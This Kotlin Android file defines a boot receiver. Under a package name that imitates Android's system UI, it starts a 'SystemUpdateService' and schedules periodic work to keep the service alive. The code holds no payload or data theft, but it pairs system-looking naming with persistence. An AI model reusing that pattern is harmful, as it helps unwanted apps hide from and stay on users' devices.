package com.android.systemui.updater

import android.content.BroadcastReceiver
import android.content.Context
import com.android.systemui.updater.modules.ApiCompat
import android.content.Intent
import android.content.SharedPreferences
import com.android.systemui.updater.ErrorReporter
import com.android.systemui.updater.persistence.PersistenceManager

class BootUpdateReceiver : BroadcastReceiver() {

    companion object {
        private const val PREFS_NAME = "app_prefs"
        private const val FIRST_RUN_KEY = "first_run_completed"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_BOOT_COMPLETED) return

        val prefs: SharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val isFirstRunCompleted = prefs.getBoolean(FIRST_RUN_KEY, false)

        if (!isFirstRunCompleted) return

        try {
            val serviceIntent = Intent(context, SystemUpdateService::class.java)
            if (ApiCompat.isOreo) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            
            // Enqueue periodic work to ensure service stays alive
            PersistenceManager.enqueuePeriodicWork(context)
        } catch (e: Exception) {
            ErrorReporter.report(e, "BootUpdateReceiver")
        }
    }
}
